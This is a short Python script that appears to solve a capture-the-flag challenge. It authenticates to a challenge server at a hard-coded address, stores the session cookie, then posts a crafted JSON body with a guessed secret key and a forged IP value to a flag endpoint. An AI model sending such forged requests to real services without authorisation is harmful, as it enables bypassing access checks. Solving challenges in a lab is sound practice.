import sys, json, time
_CH = __import__("os").path.dirname(__import__("os").path.dirname(__import__("os").path.abspath(__file__)))
sys.path.insert(0, f'{_CH}/solve')
import lib, requests

HOST = "2.29.39.4"; PORT = 1337
BASE = f"http://{HOST}:{PORT}"
s = requests.Session()
r = s.post(BASE + "/auth", json={"token": lib.team_token()}, timeout=20)
print("auth", r.status_code, r.text[:200])
print("cookie set:", "turip_session" in s.cookies)
open("/tmp/turip_cookie.txt","w").write(s.cookies.get("turip_session",""))
if len(sys.argv) > 1 and sys.argv[1] == "full":
    body = b'{"supersecretkey":"turip_ip_ip","ip":"1337.0.0.1"}'
    print("body len", len(body))
    r = s.post(BASE + "/get_flag1337", data=body, headers={"Content-Type":"application/json"}, timeout=20)
    print("flagreq", r.status_code, r.text[:300], dict(r.headers))
